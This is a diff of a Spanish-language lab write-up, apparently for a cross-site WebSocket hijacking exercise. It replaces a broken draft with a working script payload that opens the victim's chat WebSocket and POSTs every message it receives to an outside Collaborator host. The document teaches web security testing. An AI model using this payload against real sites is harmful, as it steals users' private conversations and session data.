@@ -50,15 +50,5 @@ var message = evt.data;
 no necesitamos el atributo `chatForm.getAttribute("action")` ya que este será la dirección de nuestro websocket. es decir la web de login que hemos encontrado.  tampoco vamos a necesitar el `writeMessage` porque no queremos escribir un mensaje. solo queremos enviarlo
 
 ```python
-let newWebSocket = new WebSocket(YOUR-LAB-ID);
-
-newWebSocket.onopen = function (evt) {
-	newWebSocket.send("READY");
-	res(newWebSocket);
-};
-
-newWebSocket.onmessage = function (evt) {
-	var message = evt.data;
-	fech("https://exploit-0a130040047576bc80e70294011400d5.exploit-server.net/exploit")
-};
+<script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>
 ```
